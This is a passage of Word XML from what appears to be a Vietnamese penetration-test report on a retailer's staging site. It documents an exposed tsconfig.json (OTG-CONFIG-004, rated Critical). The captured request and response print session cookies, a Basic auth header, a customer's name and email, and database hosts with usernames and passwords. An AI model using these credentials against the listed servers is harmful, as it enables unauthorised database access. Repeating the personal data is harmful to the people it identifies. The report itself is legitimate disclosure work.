              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>Success"</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Image-2021-05-19 16:32:38:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</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Request 1:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""GET /tsconfig.json HTTP/1.1</w:t>
              <w:br/>
              <w:t>Host: staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Cookie: sid_customer_82df3=4ea544d166691d870cc59667cd8d1c13-C; mp_skin=desktop; _ga_RWCJ26V2KQ=GS1.1.1621412990.4.1.1621415487.0; _utm_objs=; _pk_id.554926188.f710=376340701.1621399208.4.1621415487.1621413015.; _ga=GA1.2.122288110.1621399209; _ac_client_id=376340701.1621399209; _asm_visitor_type=r; _ac_an_session=zhzlznzhzizjzjzmzjzizdzgzkzlzgznzjzkzjzizdzizlzhziznziznzjzlzgzdzhzdzizlzhziznzizmznzrzkzdzizlzhziznzizmznzrzkzdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; gr_reco=17982ec8c2d-a3443b6d74673b0d; _gid=GA1.2.91465732.1621399213; nkudt=%7B%22ct%22%3A%22%5C%2FD0AL5C2DsZrH6znUWV2g4YezsZS%2BQKW8Oay8E6JIj%5C%2FNsDxONrScTkjjEKwMxiiZi24YmIe3Cw1qUopVmR60c2KqD1NyZs4j%2BAVzqE5Aw9%2BHbplm18E3qhsOUmvbkcbn%22%2C%22iv%22%3A%22ef98fd3771f4f0d70c847a7e20b5c6ef%22%2C%22s%22%3A%224847753923403249%22%7D; user_track_data=%7B%22identify_id%22%3A%22d41d8cd98f00b204e9800998ecf8427e%22%2C%22identify_name%22%3A%22Kiet+Anhh%22%2C%22identify_phone%22%3A%22%22%2C%22identify_email%22%3A%22ranoxpvp%40gmail.com%22%2C%22identify_address%22%3A%22%22%7D; _asm_uid=376340701; recently_products=14827%2C2047%2C85210%2C88446%2C47882%2C94048; recommend_products=10905%2C11442%2C20931%2C32630%2C41024%2C89007%2C36030%2C20853%2C64842%2C71716; nkcarttime=1621410855; current_state=001; _fbp=fb.1.1621400528403.1371688865; cto_bundle=_PLj4l9MWVY5MXMwb2V1ZXd2VlpnMDd1cnElMkJ4SyUyQjRlRE1HMExra1NmQ2hZSkslMkZDNFFCT2tzVHpTbFNob1JQVlBGNGRkVXVRN2kwc1lzNFJaS1dhbWFINk5vdzcwdXVLY1ZwcW1ZYTI2Rm5Kb3pySHVVT1BkSEtGOXhvaDhEZkdpRDVWdWJ4Q2x4N2VqeHUlMkI2aWZqVVJOM2FRcGIyS0I4TmphbURLQmZHUlZSWUNkTXExOXQlMkZDUnpzJTJGVEZvbXh6Q0FSSDhOcVlEb05KbG12eEZUMnNGODlEdXRRJTNEJTNE; PHPSESSID=17fo0tj0mp7lj0eg38ptvpo2q5; _pk_ses.554926188.f710=*; ai_client_id=12099609615.1621414009; an_session=zlzqzqzkzrzqzhzizkzdzizhzjzqzqzlzjzqzlzizmzdzizlzhziznziznzjzjzqzdzhzdzizlzhziznziznzjzjzqzdzizlzhziznziznzjzjzqzdzjzdzhzqzdzizd2f27zdzjzdzlzmzmzhzk; au_aid=12099609615; dgs=1621414021%3A3%3A0; au_gt=1621414009155; _ants_services=%5B%22tags%22%2C%22cuid%22%5D; _ants_event_his=%7B%22action%22%3A%22checkout%22%2C%22time%22%3A1621414022310%7D; _ants_utm_v2=; nkcart=1</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Authorization: Basic c3RhZ2luZ25rOlN0QWExSStuZyFOaw==</w:t>
              <w:br/>
              <w:t>Upgrade-Insecure-Requests: 1</w:t>
              <w:br/>
              <w:t>If-Modified-Since: Mon, 08 Mar 2021 07:26:21 GMT</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>""</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Response 1:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/1.1 304 Not Modified</w:t>
              <w:br/>
              <w:t>Server: nginx</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 09:35:44 GMT</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>Expires: Wed, 19 May 2021 09:38:44 GMT</w:t>
              <w:br/>
              <w:t>Cache-Control: max-age=180</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding,User-Agent</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>{</w:t>
              <w:br/>
              <w:t xml:space="preserve">  "read": {</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_host": "123.30.128.124",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_user": "devnk_user",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_password": "s7jtpXQQcEnkl1C",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_name": "devnk_db"</w:t>
              <w:br/>
              <w:t xml:space="preserve">  },</w:t>
              <w:br/>
              <w:t xml:space="preserve">  "write": {</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_host": "171.244.26.182",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_user": "nk_dung",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_password": "IyZap05REPEdD",</w:t>
              <w:br/>
              <w:t xml:space="preserve">    "db_name": "newnguyenkim_db_clone"</w:t>
              <w:br/>
              <w:t xml:space="preserve">  }</w:t>
              <w:br/>
              <w:t>}"</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Image-2021-05-19 16:36:44:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395A845" w14:textId="5FF8661E" w:rsidR="0077026D" w:rsidRDefault="0048674E" w:rsidP="00780F62">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</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bookmarkEnd w:id="13"/>
      <w:bookmarkEnd w:id="17"/>
    </w:tbl>
    <w:p w14:paraId="740EE71E" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00B25F11"/>
    <w:p w14:paraId="7AC56920" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00B25F11">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31D58882" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00B25F11" w:rsidRDefault="003B77D1" w:rsidP="00760616">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r w:rsidRPr="00B25F11">
        <w:t>Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)</w:t>
      </w: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395"/>
        <w:gridCol w:w="2695"/>
        <w:gridCol w:w="1868"/>
        <w:gridCol w:w="2369"/>
      </w:tblGrid>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="7E400094" w14:textId="77777777" w:rsidTr="001B336C">
        <w:trPr>
          <w:trHeight w:val="530"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="67E2AE27" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="14" w:name="OLE_LINK1"/>
            <w:bookmarkStart w:id="18" w:name="OLE_LINK2"/>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY INFORMATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="4620D5F6" w14:textId="77777777" w:rsidTr="00013A35">
        <w:trPr>
          <w:trHeight w:val="350"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="78633BFA" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CATEGORY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1200DCBC" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="007A3E4C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[Critical.Vuln.Category_Vuln]:unprocessed]</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="50C0821E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="74BD2B03" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>DESCRIPTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1827FA78" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="0050547A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Hệ thống chứa tệp tsconfig.json ở thư mục root và không phân quyền truy cập, kẻ tấn công có thể thoải mái truy cập và có được thông tin kết nối cơ sở dữ liệu</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002214F4" w:rsidRPr="00013A35" w14:paraId="36C833CB" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="044C9F68" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>SEVERITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC0CB"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0A8BF87B" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002216B2" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0056691F" w:rsidRPr="00013A35" w14:paraId="0659B1EB" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3977B38F" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>IMPACT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2695" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4030535C" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="003B048E" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1868" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="18FAC52B" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="0056691F" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>LIKELIHOOD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2369" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="676AC6CE" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="00636316" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="6B72A364" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3A0B391F" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>RECOMMEND</w:t>
            </w:r>
            <w:r w:rsidR="0056691F" w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>ATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5B9B2F4E" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00AE3A4C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Dời vào thư mục khác hoặc thiết lập quyền truy cập cho tệp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="340D562E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="27F32E4A" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>REFERENCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="37438335" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00F635D8" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="3FEE851A" w14:textId="77777777" w:rsidTr="001B336C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7EAFF8F3" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00E121DD" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY DETAIL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="0B22AAE2" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3C7515FB" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00377F6A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>FUNCTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="72D9085C" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00E41FA9" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>tsconfig.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="54F1EB5E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4C026483" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="007B584C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">AFFECTED </w:t>
            </w:r>
            <w:r w:rsidR="00377F6A" w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="12D6C937" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00CF70A7" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>https://staging2.nguyenkimmall.com:443/tsconfig.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="3DC315E0" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5FDF4B50" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00377F6A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>PARAMETER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
